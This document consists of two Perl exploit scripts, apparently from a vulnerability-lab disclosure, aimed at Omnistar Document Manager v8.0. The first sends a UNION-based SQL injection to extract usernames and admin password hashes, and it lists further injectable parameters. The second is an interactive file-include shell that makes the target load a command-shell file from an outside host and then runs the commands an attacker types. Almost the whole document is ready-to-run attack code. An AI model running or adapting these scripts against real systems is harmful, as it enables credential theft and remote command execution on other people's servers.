SQL-injection:

#!/usr/bin/perl

use IO::Socket;
if(@ARGV < 1){
print "
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
>  Remote SQL-Injection Exploit - Omnistar Document Manager v8.0
>  ---
>  $file ... can also be exchanged with the following parameters ---
>  $file2 = "/[INCLUDE 
> PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&pag
> e=1&return_to=@list&act=delete&id=";
>  $file3 = "/[INCLUDE 
> PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&pag
> e=-1%27&return_to=@list&act=list&sort_by=first_name&sort_order=";
>  $file4 = "/[INCLUDE 
> PATH]/index.php?area=main&interface=users&sort_by=1&sort_order=ASC&pag
> e=1&return_to=@list&act=report&id=";
>  $file5 = "/[INCLUDE 
> PATH]/index.php?area=main&interface=recycle_bin&act=list&sort_by=1&sor
> t_order=ASC&page=";
>  ---
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
";
exit();
}
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/[INCLUDE PATH]/index.php?interface=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "[+] Exploit Failed\n";
exit();
}

if ($dir =~ /\//){}
else {
print "[+] Exploit Failed\n";
exit();
 }

print "User <ID>    : ";
$ID = <STDIN>;
chop ($ID);

if ($ID =~ /exit/){
print "[+] Exploit Failed\n";
exit();
}

$len=length($ID);

if ($len == 1){}
else {
print "[+] Exploit Failed\n";
exit();
 }

$target = "-1+union+all+select+1,2,3,4,concat(X,0x3a,X,0x3a,X),6,7,+from+user+limit+1,1/*".$ID;
$target = $host.$dir.$file.$target;

print "[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n";
print "[+] Verbinden zu ... [> : $server\n"; $socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "[+] Verbindungsaufbau fehlgeschlagen...!\n"; print $socket "GET $target HTTP/1.1\n"; print $socket "Host: $server\n"; print $socket "Accept: */*\n"; print $socket "Connection: close\n\n"; print "[+] Connected!...\n"; while($answer = <$socket>) { if ($answer =~ /color=\"#FF0000\">(.*?)<\/font>/){
print "[+] Exploiting the System! Grab Admin-HASH\n"; print "[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n";
print "[+] Clear Username: $1\n";
}

if ($answer =~ /Syntax error/) {
print "+ Exploit Failed : ( \n";
print "[+] SYNTAX ERROR! Request: bkm@vulnerability-lab.com"; exit(); }

if ($answer =~ /Internal Server Error/) { print "+ Exploit Failed : (  \n"; print "[+] INTERNEL ERROR! Check out your Ressources"; exit(); } break; } close($sock);


===============================

Local file-include:

#!/usr/bin/perl

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
   	print "[shell] \$";
while(<STDIN>)
   	{
   $cmd=$_;
   chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'[INCLUDE PATH HERE!]/index.php?area='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nBitte geben sie ein Kommando ein\n\n"; $return ="";}

elsif ($return =~/Stream öen fehlgeschlagen: HTTP Request fehlgeschlagen/ || $return =~/: Kommando Zeile Angeben! <b>/)
   	{print "\nKann keine Verbindung zum CMD HOST aufbauen oder Ungü Kommando Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nUngüs Kommando oder Kein Eingabe\n\n"}

if($return =~ /(.*)/)

{
   	$finreturn = $1;
   	$finreturn=~ tr/[....]/[\n]/;
   	print "\r\n$finreturn\n\r";
   	last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n";
 print " >> Local File Include Vulnerability - Omnistar Document Manager v8.0 (?area=) \r\n";
 print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n";
 }
sub usage()
 {
 head();
 print " Usage: exploitname.pl [TARGET] [CMD SHELL location] [CMD SHELL Variable]\r \n\n";
 print " <Seite> [Full Path]  [http://www.webseite.com/] 			    \r\n";
 print " <CMD SHELL> <Path to CMD Shell> <http://www.seite.com/cmdfile.txt> 	    \r\n";
 print " <CMD VARIABLE> - Command variable - PHP SHELL 				    \r\n";
 print "============================================================================\r\n";
 print "                       	by ~BKM AKA Rem0ve  				    \r\n";
 print "                       	www.vulnerability-lab.com 			    \r\n";
 print "============================================================================\r\n";
 exit();
 }
